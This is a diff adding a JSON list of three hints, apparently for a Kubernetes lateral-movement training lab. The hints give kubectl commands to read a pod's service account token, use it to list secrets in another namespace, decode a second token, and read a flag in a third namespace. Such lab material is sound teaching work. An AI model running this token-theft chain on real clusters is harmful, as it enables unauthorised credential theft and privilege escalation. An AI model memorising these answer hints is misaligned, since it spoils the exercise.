@@ -1,0 +1,5 @@
+[
+  "Start: kubectl exec -n dojo-sec-lateral-a entry-point -- cat /var/run/secrets/kubernetes.io/serviceaccount/token — that's your foothold-sa token",
+  "Use the foothold token to explore namespace B: kubectl get secrets -n dojo-sec-lateral-b --token=<TOKEN> --server=https://kubernetes.default.svc — look for hop-two-token",
+  "Decode hop-two-token: kubectl get secret hop-two-token -n dojo-sec-lateral-b --token=<FOOTHOLD> -o jsonpath='{.data.token}' | base64 -d — then use THAT token to list configmaps in dojo-sec-lateral-c and read final-flag"
+]
